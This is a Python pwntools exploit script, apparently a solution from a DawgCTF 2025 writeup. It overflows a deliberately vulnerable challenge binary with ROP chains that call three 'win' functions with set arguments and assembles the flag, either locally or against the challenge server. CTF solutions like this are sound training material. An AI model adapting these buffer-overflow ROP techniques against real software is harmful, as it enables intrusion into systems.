#!/usr/bin/env python3
import sys

from pwn import *

context.binary = "/ctf-writeups/2025/dawgctf/pwn/64-bits-in-my-ark-and-texture/dist/chall"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h", "-p 65"]
elf = context.binary

is_remote = len(sys.argv) == 2 and sys.argv[1] == "remote"


def attach(r):
    if is_remote:
        return

    bkps = []
    gdb.attach(r, "\n".join(f"break {x}" for x in bkps))


def answer_intro_questions(r):
    for ans in [b"2", b"1", b"4"]:
        r.sendlineafter(b"?", ans)


def build_rop_payload(padding_len, win_func, *args):
    rop = ROP(elf)
    rop.raw(b"A" * padding_len)
    rop.raw(rop.ret)
    rop.call(win_func, list(args))
    return rop.chain()


def exploit_win1(r):
    payload = build_rop_payload(0x98, elf.sym.win1)
    r.sendlineafter(b"\n", payload)
    r.recvuntil(b"advance.")
    return r.recvline().strip().decode()


def exploit_win2(r):
    payload = build_rop_payload(0x28, elf.sym.win2, 0xdeadbeef)
    r.sendlineafter(b"Continue: \n", payload)
    r.recvuntil(b"you\n")
    return r.recvline().strip().decode()


def exploit_win3(r):
    payload = build_rop_payload(0x38, elf.sym.win3, 0xdeadbeef, 0xdeafface, 0xfeedcafe)
    r.sendlineafter(b"Test: \n", payload)
    r.recvuntil(b"reward\n\n")
    return r.recvline().strip().decode()


def exploit(r):
    attach(r)
    answer_intro_questions(r)

    flag = exploit_win1(r)
    flag += exploit_win2(r)
    flag += exploit_win3(r)

    log.info(f'flag: {flag}')


if __name__ == "__main__":
    r = remote("connect.umbccd.net", 22237) if is_remote else process(elf.path)
    exploit(r)
    sys.exit()
